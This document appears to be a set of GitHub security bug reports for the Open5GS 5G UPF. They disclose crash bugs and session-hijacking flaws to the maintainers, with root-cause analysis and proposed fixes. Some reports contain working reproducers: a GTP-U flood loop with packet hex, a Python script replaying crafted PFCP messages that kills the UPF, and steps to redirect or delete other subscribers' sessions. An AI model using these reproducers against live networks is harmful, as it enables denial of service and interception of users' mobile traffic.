labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

The issue was reproduced in a controlled test environment with:

```text
UPF PFCP endpoint: 127.0.0.7:8805
UPF GTP-U endpoint: 127.0.0.7:2152
PFCP CP endpoint:  127.0.0.5:8805

global.max.ue: 1024
```

The tested UPF was built with ASan enabled, but the process termination is caused by an explicit Open5GS assertion (`ogs_abort()`), not by an ASan memory-safety finding.

The relevant GTP-U Error Indication path contains:

```c
/* src/upf/gtp-path.c */

if (report.type.error_indication_report) {
    ogs_assert(far->sess);
    sess = UPF_SESS(far->sess);
    ogs_assert(sess);

    ogs_assert(OGS_OK ==
        upf_pfcp_send_session_report_request(sess, &report));
}
```

`upf_pfcp_send_session_report_request()` creates a local PFCP transaction and returns `OGS_ERROR` if the transaction cannot be allocated:

```c
xact = ogs_pfcp_xact_local_create(
        sess->pfcp_node, sess_timeout, OGS_UINT_TO_POINTER(sess->id));

if (!xact) {
    ogs_error("ogs_pfcp_xact_local_create() failed");
    return OGS_ERROR;
}
```

Therefore, when PFCP transaction/timer resources are exhausted, the allocation failure is propagated as `OGS_ERROR`, but the caller converts it into a fatal assertion.

### Steps to reproduce

1. Start the UPF from a clean state.

2. Establish a PFCP association with the UPF.

3. Establish one PFCP session containing a PDR associated with a FAR whose Outer Header Creation uses:

```text
Remote GTP-U TEID: 0x11111111
Remote GTP-U IPv4: 127.0.0.9
```

The session used in this reproduction had:

```text
UE IPv4:      10.45.0.2
Ingress TEID: 0x00000044
FAR ID:       1
PDR ID:       1
```

4. Keep the PFCP association alive normally.

PFCP Heartbeat Requests are answered normally.

5. Continuously receive and drain PFCP Session Report Requests (`message type 56`) sent by the UPF, but deliberately do **not** send PFCP Session Report Responses.

This keeps the generated Session Report transactions outstanding while preventing the receiver's UDP socket buffer from becoming the limiting factor.

6. Send valid GTP-U Error Indication messages to:

```text
127.0.0.7:2152
```

The Error Indication contains:

```text
TEID Data I:
    TEID = 0x11111111

GTP-U Peer Address:
    IPv4 = 127.0.0.9
```

The complete GTP-U packet used for the reproduction is:

```text
321a0010000000000001000010111111118500047f000009
```

7. Send 6000 copies using batches of 20 packets with a 10 ms delay after each batch:

```python
for sent in range(1, 6001):
    sock.sendto(error_indication, ("127.0.0.7", 2152))

    if sent % 20 == 0:
        time.sleep(0.01)
```

No process-liveness checks or subprocesses are executed during the sending loop.

In the reproduced run:

```text
PFCP session established: 17:46:47.829
UPF abort:                17:46:50.632
```

The crash therefore occurred approximately 2.8 seconds after session establishment.

With the test configuration above (`global.max.ue=1024`), approximately 5.5k outstanding Error-Indication-triggered reports were sufficient to exhaust the timer pool.

The exact threshold is configuration- and timing-dependent. The 6000-packet count is used here for reproducibility and should not be interpreted as a universal threshold.



### Logs

```text
09/16 17:46:50.632: [event] ERROR: Failed to allocate timer object from pool (../lib/core/ogs-timer.c:84)
09/16 17:46:50.632: [pfcp] ERROR: Maximum number of xact->tm_delayed_commit[16384] reached (../lib/pfcp/xact.c:119)
09/16 17:46:50.632: [upf] ERROR: ogs_pfcp_xact_local_create() failed (../src/upf/pfcp-path.c:371)
09/16 17:46:50.632: [upf] FATAL: _gtpv1_u_recv_cb: Assertion `OGS_OK == upf_pfcp_send_session_report_request(sess, &report)' failed. (../src/upf/gtp-path.c:367)
09/16 17:46:50.633: [core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c:37)

/path/to/open5gs/build_v2.7.7/src/upf/../../lib/core/libogscore.so.2(ogs_abort+0xcd)
open5gs-upfd(+0xa6632)
libogscore.so.2(+0x139136)
open5gs-upfd(+0x7b205)
libogscore.so.2(+0xdee44)
libasan.so.8(+0x5ea42)
libc.so.6(+0x9cb84)
libc.so.6(+0x129ecc)
```

### Expected behaviour

The UPF should remain alive when PFCP transaction or timer resources are exhausted.

A failure of `ogs_pfcp_xact_local_create()` while processing a GTP-U Error Indication should be handled as a recoverable allocation/resource-exhaustion condition.

For example, the UPF could:

* log the failed Session Report allocation;
* drop additional reports once resources are exhausted;
* coalesce repeated Error Indications for the same FAR/session;
* rate-limit Error-Indication-triggered Session Reports;
* limit the number of outstanding Session Report transactions;
* return from the GTP-U receive callback without aborting the process.

In particular, an `OGS_ERROR` returned by `upf_pfcp_send_session_report_request()` should not terminate the whole `open5gs-upfd` process through `ogs_assert()`.



### Observed Behaviour

Each matching GTP-U Error Indication causes the UPF to generate a PFCP Session Report Request.

Because the Session Report Responses are not returned in this reproduction, the local PFCP transactions remain outstanding and accumulate.

Each PFCP transaction requires timer objects. With:

```text
global.max.ue = 1024
timer pool    = 16384
```

the timer pool is eventually exhausted.

`ogs_pfcp_xact_local_create()` then fails and returns `NULL`.

`upf_pfcp_send_session_report_request()` correctly propagates this as `OGS_ERROR`, but `_gtpv1_u_recv_cb()` contains:

```c
ogs_assert(OGS_OK ==
    upf_pfcp_send_session_report_request(sess, &report));
```

This converts the allocation failure into a fatal process-wide abort.

The failure sequence is therefore:

```text
Repeated valid GTP-U Error Indications
        ↓
PFCP Session Report Requests are generated
        ↓
Local PFCP transactions remain outstanding
        ↓
PFCP transaction/timer resources accumulate
        ↓
global timer pool is exhausted
        ↓
ogs_pfcp_xact_local_create() returns NULL
        ↓
upf_pfcp_send_session_report_request() returns OGS_ERROR
        ↓
_gtpv1_u_recv_cb() reaches the fatal assertion
        ↓
open5gs-upfd aborts
```


### Relation to potential duplicates

GitHub suggested #4491, #4791 and #4699 as potential duplicates.

This issue is different from #4491, which concerns malformed GTP-U traffic causing a SIGSEGV in the GTP-U packet parsing/rule-matching path.

It is also different from #4699, which is triggered by a stateful PFCP sequence involving malformed Outer Header Creation fields and terminates with `Unknown family(0)`.

#4791 is related because it also involves PFCP transaction/timer pool exhaustion. However, #4791 exhausts **remote PFCP transactions** through direct PFCP traffic on UDP/8805 and crashes in `ogs_pfcp_xact_receive()` after `ogs_pfcp_xact_remote_create()` fails.

The issue reported here is triggered through **GTP-U Error Indications on UDP/2152**, causes accumulation of **local PFCP Session Report transactions** created by `ogs_pfcp_xact_local_create()`, and terminates in `_gtpv1_u_recv_cb()` when `upf_pfcp_send_session_report_request()` returns `OGS_ERROR`.



### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Security Bug]: UPF applies PFCP Session Modification and Session Deletion Requests from any associated peer.

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76)

### Security impact

Any associated peer (in practice: any registered UE, via the data-plane
delivery path) can, with one well-formed message per session and Cause-1
acknowledgements (no crash, no malformed input):

- **redirect or blackhole** the downlink of **every** live PDU session on the
  UPF (modification variant: UpdateFAR FORWARD + Outer Header Creation, or
  Apply Action = DROP), or
- **destroy any live PDU session** on the UPF (deletion variant: total
  user-plane DoS per session, GTP-U Error Indications to the RAN, and
  permanent CP/UP state desynchronization — the SMF continues operating on a
  session that no longer exists).

This is a full confidentiality/integrity/availability break of the user plane.

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **UPF** only — its N4 session dispatch. Inbound Session Modification and
Session Deletion Requests are resolved from the header SEID alone
(`upf_sess_find_by_upf_n4_seid()`, `src/upf/pfcp-sm.c:197`), the handlers
(`src/upf/n4-handler.c:243` modification, `src/upf/n4-handler.c:447`
deletion) only check that the session exists, the UpdateFAR applier
(`ogs_pfcp_handle_update_far`, `lib/pfcp/handler.c:1299`) applies
rebind/redirect/DROP with no ownership check, and session removal
(`src/upf/context.c:256`) never notifies the owning CP function. The SMF is
not affected by this root cause.

### Summary

For inbound PFCP Session Modification and Session Deletion Requests, the UPF
resolves the target session from the **header SEID alone** and never verifies
that the PFCP peer that sent the request is the one that owns the session.
This is one root cause with two impact variants:

- **Modification** — once a peer is associated (see the unauthenticated-association
  issue), it can modify **any** live session: re-bind the victim's FAR with Outer
  Header Creation to redirect the victim's downlink to the attacker, or set
  Apply Action = DROP to blackhole it.
- **Deletion** — it can delete **any** live PDU session with a single well-formed
  message: the UPF answers Cause 1 (Request accepted), destroys the session
  context, and never notifies the SMF. The SMF keeps the session in its own
  state indefinitely (CP/UP desync), the UPF sends GTP-U Error Indications to
  the gNB for the invalidated tunnel, and all user-plane traffic for the victim
  UE fails (100% packet loss).

Both variants use well-formed messages, get Cause 1 (Request accepted)
responses, and cause no crash.

In our lab the N4 endpoint is reachable from the data plane (PFCP datagram as
the payload of an uplink IP packet over the attacker's own PDU session; the
gNB GTP-U-encapsulates it, the UPF decapsulates it onto its own N4 socket).

### Steps to reproduce

**Variant A — cross-association session modification (multi-UE lab).**
Attacker UE `10.45.0.2`, benign peer UE `10.45.0.3` (both attached, each with
a PDU session). UPF N4 `192.168.231.132:8805`, N3 `192.168.231.132:2152`,
gNB `192.168.231.140:2152`, attacker sink `192.168.231.150:2152`.

1. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to `192.168.231.132:8805` through the PDU session. UPF answers
   Cause 1.
2. Read the peer UE's UP-SEID from the UPF log
   (`UE F-SEID[UP:0xfa0 CP:0xd2] ... IPv4[10.45.0.3]`). The UP-SEID is a small
   value from a bounded, enumerable pool.
3. Send a Session Modification Request with header SEID `0xfa0` and one
   UpdateFAR IE:

   | Field | Value (blackhole variant) |
   |---|---|
   | Header SEID | `0xfa0` (peer UE's UP-SEID) |
   | UpdateFAR (IE 10) | FAR ID 1, Apply Action = DROP (`0x0100`), no Update Forwarding Parameters |

   For the redirection variant, use Apply Action = FORWARD (`0x0200`) with an
   Update Forwarding Parameters containing Outer Header Creation
   (GTP-U/UDP/IPv4 → `192.168.231.150:2152`, TEID `0xbeef`).
4. Measure downlink delivery to the peer UE (`10.45.0.3`) before / during /
   after, from the data-network side and UE-to-UE.

**Variant B — cross-association session deletion (single-UE lab).**
Attacker UE `10.45.0.2` (attached, one PDU session), UPF N4
`192.168.230.132:8805`, N3 `192.168.230.132:2152`, gNB `192.168.230.140:2152`.

1. Attach the UE through the 5GC. The SMF-established session gets
   UP-SEID `0x686` (1670) / CP-SEID `0xee` (read from the UPF log).
2. From the attacker UE, send a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to `192.168.230.132:8805` through the PDU session. UPF answers
   Cause 1.
3. Send a series of PFCP Session Deletion Requests through the same path,
   stepping the PFCP header SEID over candidate values: 1..10, 0x684, 0x685,
   0x687, 0x688, 0x686. Each miss is answered with Cause 65 (which also
   confirms which SEIDs exist); the hit destroys the session.
4. After the deletion, ping through the victim session and watch the SMF logs.

### Logs (Attached)

[R2-upf-cross-association-session-modification-deletion.zip](https://github.com/user-attachments/files/31614946/R2-upf-cross-association-session-modification-deletion.zip)

**Variant A — modification.** The whole chain, attacker peer `10.45.0.2` vs.
the SMF peer `192.168.231.133`:

```shell
[upf] DEBUG: Merged PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-path.c:161)
[upf] DEBUG: Session Modification Request (../open5gs-src/src/upf/n4-handler.c:258)   # attributed to peer [10.45.0.2]:8805
[upf] INFO: UE F-SEID[UP:0xfa0 CP:0xd2] APN[internet] PDN-Type[1] IPv4[10.45.0.3] IPv6[] (../open5gs-src/src/upf/context.c:498)
```

`capture-n4.pcap` (DROP variant): SEIDs 1–8, 0xf9c–0xf9f, 0xfa1–0xfa4 answered
`Cause=65`; **SEID 0xfa0 answered `IE19 Cause=1 (Request accepted)`** — the
request came from peer `10.45.0.2:8805`, while the session's owning peer is
the SMF (`192.168.231.133:8805`). The response's SEID field is `0xd2` — the
victim's CP F-SEID, leaked to the attacker.

Measured effect (pcap-counted, two independent paths):

```text
N6 (data-network -> 10.45.0.3):  baseline 5/5 replies -> DROP active 5 req / 0 replies
UE-to-UE:                        baseline 5/5 -> DROP active 0/5
peer UE tun:                     completely silent during the drop window
restore (UpdateFAR FORW, same SEID 0xfa0): Cause 1 -> 5/5 replies again
```

Redirection variant (UpdateFAR FORWARD + OHC TEID `0xbeef` on the other
victim's SEID `0x700`): `ohc_redirect_capture.pcap` contains 3 UPF-originated
GTP-U packets `192.168.231.132:2152 -> 192.168.231.150:2152`, outer TEID
`0xbeef`, inner ICMP `10.45.0.2 -> 10.45.0.3` — the victim's downlink path
re-written to the attacker's sink; peer delivery 3/3 before, 0/3 after.

**Variant B — deletion.** The live session before the attack, then the deletion
burst (14 candidate SEIDs → Cause 65), the accepted hit, the UPF session
count, the SMF silence, and the post-deletion Error Indications:

```shell
08/28 14:09:18.950: [upf] INFO: [Added] Number of UPF-Sessions is now 1 (../open5gs-src/src/upf/context.c:212)
08/28 14:09:18.950: [upf] DEBUG: Session Establishment Request (../open5gs-src/src/upf/n4-handler.c:66)
08/28 14:09:18.950: [upf] INFO: UE F-SEID[UP:0x686 CP:0xee] APN[internet] PDN-Type[1] IPv4[10.45.0.2] IPv6[] (../open5gs-src/src/upf/context.c:498)
08/28 14:09:25.316: [upf] DEBUG: Session Deletion Request (../open5gs-src/src/upf/n4-handler.c:456)   # SEIDs 1..10, 0x684, 0x685, 0x687, 0x688 -> each answered Cause 65 "Session context not found"
08/28 14:09:33.096: [upf] DEBUG: Session Deletion Response (../open5gs-src/src/upf/n4-build.c:130)    # SEID 0x686 -> Cause 1 "Request accepted" + CP-SEID 0xee echoed back + Usage Report IE
08/28 14:09:33.096: [upf] INFO: [Removed] Number of UPF-sessions is now 0 (../open5gs-src/src/upf/context.c:256)
08/28 14:09:34.151: [upf] ERROR: [192.168.230.132] Send Error Indication [TEID:0x7f11] to [192.168.230.140] (../open5gs-src/src/upf/gtp-path.c:412)
```

`capture-n4.pcap` pkts 41–42: Session Deletion Request for SEID `0x686` from
`10.45.0.2:8805` → Session Deletion Response with `Cause=1 (Request accepted)`.
The session's owning peer is the SMF (`192.168.230.133:8805`); the deleting
peer is the UE address.

`logs/open5gs/smf.log` (14:09:18 – 14:09:42): no N4 session release and no SM
signalling at all — the SMF never learns that the UPF destroyed its session.

Post-deletion connectivity check: 100% packet loss.

### Expected behaviour

The UPF must check that the PFCP node that sent the Session Modification or
Session Deletion Request is the node that owns the session (the session's
recorded peer / F-SEID address). A request from a different association must
be answered with `Session context not found` (cause 65) and must not change
state. If a session is legitimately deleted, the UPF must notify the owning
CP function so it can clean up its own state.

### Observed Behaviour

Both message types dispatch through the same session lookup, which uses the
header SEID only — there is no comparison against the requesting node anywhere
downstream:

```c
/* src/upf/pfcp-sm.c — upf_pfcp_state_associated() */
if (message->h.seid_presence && message->h.seid != 0)
    sess = upf_sess_find_by_upf_n4_seid(message->h.seid);   /* <- header SEID only */
    ...
    case OGS_PFCP_SESSION_MODIFICATION_REQUEST_TYPE:
        upf_n4_handle_session_modification_request(...);
    case OGS_PFCP_SESSION_DELETION_REQUEST_TYPE:
        upf_n4_handle_session_deletion_request(
            sess, xact, &message->pfcp_session_deletion_request);
```

**Modification path.** The handler's only check is `!sess`; after that the
request is applied from any peer:

```c
/* src/upf/n4-handler.c — upf_n4_handle_session_modification_request() */
if (!sess) {
    ogs_error("No Context");
    ogs_pfcp_send_error_message(xact, 0,
            OGS_PFCP_SESSION_MODIFICATION_RESPONSE_TYPE,
            OGS_PFCP_CAUSE_SESSION_CONTEXT_NOT_FOUND, 0);   /* cause 65, only when SEID is unknown */
    return;
}
/* then applies CreatePDR/UpdatePDR/UpdateFAR/... from the request */
```

The UpdateFAR handler (`lib/pfcp/handler.c`, `ogs_pfcp_handle_update_far`)
applies FAR-ID rebind, Apply Action (FORWARD/DROP) and Outer Header Creation
without any ownership check.

**Deletion path.** The handler's only check is likewise `!sess`; the deletion
is executed and acknowledged to ANY peer:

```c
/* src/upf/n4-handler.c — upf_n4_handle_session_deletion_request() */
if (!sess) {
    ogs_error("No Context");
    ogs_pfcp_send_error_message(xact, 0,
            OGS_PFCP_SESSION_DELETION_RESPONSE_TYPE,
            OGS_PFCP_CAUSE_SESSION_CONTEXT_NOT_FOUND, 0);
    return;
}
upf_pfcp_send_session_deletion_response(xact, sess);   /* cause 1 to ANY peer */
```

Nothing downstream compares `xact`'s source address with the session's owning
node, and nothing notifies the SMF when the context is removed
(`src/upf/context.c:256` frees the session, clears the UE-IP/SEID hashes and
returns without any CP notification).

The enumeration is easy: the UP-SEID pool is bounded, misses are answered
with a cause (which also confirms candidate SEIDs), and the UPF log prints
every live session's UP-SEID.

UERANSIM

labels.name: Type:Security

items.body:
**Update (August 2026):**

The original description below reflects the initial analysis performed when reporting the issue. Subsequent debugging and discussion with the Open5GS maintainers showed that the crash originates from an error-path state leak during failed GTP-U peer setup rather than from the Session Deletion itself. The reduced reproducer and detailed root-cause analysis are provided in the comments below.

---

### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

Start Open5GS v2.7.7 normally, with the UPF PFCP interface reachable at `127.0.0.7:8805`.

Then run the following minimal Python reproducer from a host that can reach the UPF N4 interface:

```python
#!/usr/bin/env python3
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.7"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8805
LOCAL_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8806

messages = [
    (
        "assoc_setup",
        "2005001500cdd700003c0005007f00000700600004ee023068",
    ),
    (
        "session_estab_outer_header_creation_fields_1",
        "21320067000000000000000000cde000003c0005007f0000070039000d0200000000f000781e7f0000070001001f003800020001001d000400000064000200050014000100006c0004000000010003001a006c000400000001002c00020200000400080054000402000102",
    ),
    (
        "session_estab_outer_header_creation_fields_2",
        "21320067000000000000000000f0c200003c0005007f0000070039000d0200000000f000b4657f0000070001001f003800020001001d000400000064000200050014000100006c0004000000010003001a006c000400000001002c00020200000400080054000402000102",
    ),
    (
        "session_del",
        "2136000c00000000f000b46500f0c300",
    ),
]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(0.5)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    sock.bind(("", LOCAL_PORT))
except OSError as e:
    print(f"Could not bind local UDP port {LOCAL_PORT}: {e}")
    sys.exit(1)

for i, (name, hex_msg) in enumerate(messages, start=1):
    data = bytes.fromhex(hex_msg)
    print(f"[>] {i}/{len(messages)} {name} len={len(data)}")
    sock.sendto(data, (HOST, PORT))

    try:
        resp, _ = sock.recvfrom(65535)
        print(f"[<] response len={len(resp)}")
    except socket.timeout:
        print("[<] no response")

    time.sleep(0.05)

sock.close()
print("Done. Check whether open5gs-upfd is still running.")
```

Run:

```bash
python3 open5gs_upf_unknown_family_repro.py 127.0.0.7 8805 8806
```

After replaying the sequence, check the UPF process:

```bash
pgrep -af open5gs-upfd || echo "open5gs-upfd is down"
```



### Logs

```shell
Relevant UPF log excerpt during the replay:


[upf] INFO: PFCP associated [127.0.0.7]:8805 [127.0.0.1]:8806 (../src/upf/pfcp-sm.c:168)

[upf] INFO: [Added] Number of UPF-Sessions is now 1 (../src/upf/context.c:212)
[gtp] WARNING: gtp_connect() [::]:2152 failed (../lib/gtp/path.c:72)
[pfcp] ERROR: ogs_gtp_connect() failed (../lib/pfcp/context.c:1222)
[upf] FATAL: CHECK CONFIGURATION: upf.gtpu (../src/upf/n4-handler.c:141)
[upf] FATAL: ogs_pfcp_setup_far_gtpu_node() failed (../src/upf/n4-handler.c:142)
[upf] ERROR: ogs_pfcp_extract_node_id() failed type [51] pfcp_status [4] from [127.0.0.7]:8805 (../src/upf/pfcp-path.c:114)

[upf] INFO: [Added] Number of UPF-Sessions is now 2 (../src/upf/context.c:212)
[pfcp] FATAL: Unknown family(0) (../lib/pfcp/context.c:1744)
[core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

The UPF should reject malformed PFCP Session Establishment / Session Deletion input gracefully and return an appropriate PFCP error cause, or ignore the malformed message.

It should not call `ogs_fatal()` / `abort()` or terminate the `open5gs-upfd` process.


### Observed Behaviour

### Summary

The Open5GS UPF process crashes on `v2.7.7` after replaying a short stateful PFCP sequence involving repeated malformed `Outer Header Creation` fields.

The minimized reproducer contains four PFCP messages:

1. PFCP Association Setup Request
2. PFCP Session Establishment Request with malformed Outer Header Creation fields
3. PFCP Session Establishment Request with malformed Outer Header Creation fields
4. PFCP Session Deletion Request

The UPF terminates with:

```text
[pfcp] FATAL: Unknown family(0) (../lib/pfcp/context.c:1744)
[core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Reproducer characteristics

The minimal reproducer is the following four-message PFCP sequence:

```text
assoc_setup
session_estab_outer_header_creation_fields
session_estab_outer_header_creation_fields
session_del
```

Removing any one of these four messages prevents the crash in my tests. In particular, removing the final PFCP Session Deletion Request makes the UPF stay alive, so the reproducer should be considered a four-message stateful sequence, not a three-message one.

I also reproduced the same fatal signature when additional PFCP messages were present between the relevant steps. This suggests that the crash is related to persistent UPF/PFCP state across multiple messages, rather than a single isolated malformed packet.

The observed fatal signature is:

```text
Unknown family(0) (../lib/pfcp/context.c:1744)
```

### Relation to potential duplicates

GitHub suggested #4491 and #4423 as potential duplicates.

I do not think #4491 is the same issue because it concerns crafted GTP-U traffic on UDP/2152 and a SIGSEGV/exit 139 on the GTP-U receive datapath. This report is about PFCP/N4 traffic on UDP/8805 and terminates with:

```text
Unknown family(0) (../lib/pfcp/context.c:1744)
```

#4423 is related because it also involves UPF crashes around `OuterHeaderCreation`, but it describes a zero-length `OuterHeaderCreate` IE in a single PFCP Session Establishment Request. This reproducer is different: it uses a four-message stateful PFCP sequence, the OHC IE is not the zero-length case, and removing any one of the four messages prevents reproduction in my tests.



### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Security Bug]: UPF does not enforce UE-IP uniqueness across sessions.

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76)

### Security impact

Any associated peer (in practice: any registered UE, via the data-plane
delivery path) can claim any other UE's IP with one rogue Session
Establishment: the victim's entire downlink (all applications, all flows) is
silently re-routed to the attacker — full confidentiality/integrity/
availability break for the victim UE, no malformed input, no crash.

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **UPF** only — its session/PDR handling. `upf_sess_set_ue_ip()`
(`src/upf/context.c:396`) installs a session's UE IP into `self.ipv4_hash`
with no check that another live session already owns the address, and
`ogs_pfcp_ue_ip_alloc()` (`lib/pfcp/context.c:2339`) grants an
attacker-chosen static IP that is already in use without consulting the
hash; the call site is the CreatePDR loop of the Session Establishment
handler (`src/upf/n4-handler.c:182`). The SMF is not affected by this root
cause — it does not accept PFCP Session Establishment Requests.

### Summary

`upf_sess_set_ue_ip()` installs a session's UE IP into `self.ipv4_hash` with
no check that the address is already owned by a different session, and
`ogs_pfcp_ue_ip_alloc()` succeeds for an address that is already in use. A
PFCP peer can therefore establish a **second, rival session whose PDI claims
another UE's IP address** (APN/DNN omitted). Both sessions now map
`10.45.0.3`; the hash points at the newest one, so every downlink packet
addressed to the victim UE is matched and forwarded by the **attacker's**
PDR/FAR instead of the victim's — a silent, complete traffic theft with
Cause-1 acknowledgements and no crash.

In our lab the N4 endpoint is reachable from the data plane (PFCP datagram as
the payload of an uplink IP packet over the attacker's own PDU session; the
gNB GTP-U-encapsulates it, the UPF decapsulates it onto its own N4 socket).

### Steps to reproduce

Scenario:
* Attacker UE: `10.45.0.2`, Sink for testing attack: `192.168.231.150:2152`.
* Benign peer UE: `10.45.0.3` (both attached, each
with a PDU session).
* UPF N4: `192.168.231.132:8805`
* N3: `192.168.231.132:2152`


1. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to the UPF. Accepted with Cause 1.
2. Send a PFCP Session Establishment Request through the same path with:
   Create F-SEID (CP-SEID `0x9999`), PDN Type = IPv4, and one CreatePDR whose
   PDI sets Source Interface = CORE and carries a **UE IP Address IE equal to
   the peer UE's IP `10.45.0.3`** plus an F-TEID IE (CH=1), and one CreateFAR
   (FORWARD + Outer Header Creation GTP-U/UDP/IPv4 →
   `192.168.231.150:2152`, TEID `0xbeef`).
3. Send 10 ICMP probes from the attacker UE to `10.45.0.3` — their delivery
   to the peer UE is the downlink leg — and watch both the attacker sink and
   the peer UE.

### Logs (Attached)

[R4-upf-ueip-uniqueness-not-enforced.zip](https://github.com/user-attachments/files/31615307/R4-upf-ueip-uniqueness-not-enforced.zip)

The peer UE's legitimate session, then the attacker's rogue session claiming
the same IP — note the UPF logs **two live sessions with `IPv4[10.45.0.3]`**:

```shell
08/28 18:33:13.191: [upf] DEBUG: Added PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-path.c:140)
08/28 18:33:13.191: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
08/28 18:33:15.308: [upf] INFO: [Added] Number of UPF-Sessions is now 3 (../open5gs-src/src/upf/context.c:212)
08/28 18:33:15.308: [upf] DEBUG: Session Establishment Request (../open5gs-src/src/upf/n4-handler.c:66)
08/28 18:33:15.308: [upf] INFO: UE F-SEID[UP:0x844 CP:0x9999] APN[(null)] PDN-Type[1] IPv4[10.45.0.3] IPv6[] (../open5gs-src/src/upf/context.c:498)
```

earlier in the same log:

```shell
08/28 18:32:51.565: [upf] INFO: UE F-SEID[UP:0xcf5 CP:0x27a] APN[internet] PDN-Type[1] IPv4[10.45.0.3] IPv6[] (../open5gs-src/src/upf/context.c:498)
```

Measured effect (`q003_sink_redirect.pcap` pkts 1–10; the same 10 probes are
visible entering the UPF on `capture-n3.pcap` pkts 21, 25, 27, 29, …, 41 and
leaving GTP-U-encapsulated toward the sink at pkts 22, 26, 28, 30, …, 42):
**10/10 downlink probes destined for `10.45.0.3` (inner ICMP
`10.45.0.2 -> 10.45.0.3`) arrive at the attacker sink GTP-U-encapsulated with
TEID `0xbeef`**; `capture-n3.pcap` also catches later victim-downlink traffic
being re-written to the sink with TEID `0xbeef` (pkts 50, 52, 54 — the echo
replies to the peer UE's own pings — and pkts 55–57 — data-network-side echo
probes); `capture-ue-victim.pcap` shows the peer UE received none of them
(pre-attack 0% loss → post-attack 100% loss).

### Expected behaviour

The UPF must reject a PDR whose UE IP address collides with the address of a
different live session (cause: request rejected / no resources available per
implementation policy) — address ownership must follow the SMF's assignment,
not whatever a PFCP peer claims in a PDI.

### Observed Behaviour

```c
/* src/upf/context.c — upf_sess_set_ue_ip() */
if (session_type == OGS_PDU_SESSION_TYPE_IPV4) {
    if (ue_ip->ipv4 || pdr->dnn) {
        sess->ipv4 = ogs_pfcp_ue_ip_alloc(&cause_value, AF_INET,
                        pdr->dnn, (uint8_t *)&(ue_ip->addr));
        ...
        ogs_hash_set(self.ipv4_hash, sess->ipv4->addr, OGS_IPV4_LEN, sess);
        /* <- unconditional last-write-wins; no "already owned by
              another session" check anywhere before this point */
    }
}
```

`ogs_pfcp_ue_ip_alloc()` allocates from the (DNN-keyed) subnet pool and does
not consult `self.ipv4_hash` for foreign ownership — with `pdr->dnn == NULL`
the rogue establishment happily receives the victim's address. The call site
(`src/upf/n4-handler.c:182`, in the CreatePDR loop of the Establishment
handler) never compares against other sessions either.

Two related hazards in the same function: on session removal
(`src/upf/context.c`, `upf_sess_remove()`) the code unconditionally frees
`sess->ipv4` and nulls the hash entry, so a removal of *either* session
corrupts the other's address state.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Security Bug]: DoS - UE user plane can destroy arbitrary UPF session context via rejected PFCP Session Modification

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). Source verified at the pinned HEAD
(`git status` clean); reproduced twice in independent lab runs.

### Security impact

One well-formed message (valid PFCP encoding, one semantically invalid IE) erases the entire forwarding state of any live PDU session on the UPF: total user-plane DoS per session (uplink and downlink), GTP-U Error Indications to the RAN, persistent until the UE re-establishes — with the SMF and the UE unaware (no crash, no malformed input, no control-plane teardown). Any associated peer (in practice: any registered UE, via the data-plane delivery path) can do this per message, and the legitimate SMF self-inflicts the same wipe on any of its own rejected modifications. The trigger is generic: any rejected update in the session-modification handler reaches the same cleanup, not only the invalid Outer Header Creation shown here.

**CVSS v3.1 Score: 6.5 (Medium)** - AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H

### Affected components

The **UPF** only — its Session Modification error path. The `cleanup:` label of `upf_n4_handle_session_modification_request()`
(`src/upf/n4-handler.c:440-445`) calls `ogs_pfcp_sess_clear(&sess->pfcp)`, (`lib/pfcp/context.c:1283`) before the rejection is answered, erasing all PDRs/FARs/URRs/QERs of the resolved session. The SMF is not affected by this root cause — it does not accept PFCP Session Modification Requests (it only sends them).

### Summary

For an inbound PFCP Session Modification Request, the UPF resolves the target session from the **header SEID alone** (see the separate cross-association report) and then, when it must **reject** any part of the update — e.g. an unsupported Outer Header Creation description, answered `Cause 76 (Service not supported)` with Offending-IE — the handler's error-cleanup path calls
`ogs_pfcp_sess_clear(&sess->pfcp)` **before sending the error response**. That call removes **all** PDRs, FARs, URRs and QERs of the resolved session, not just the rejected update.

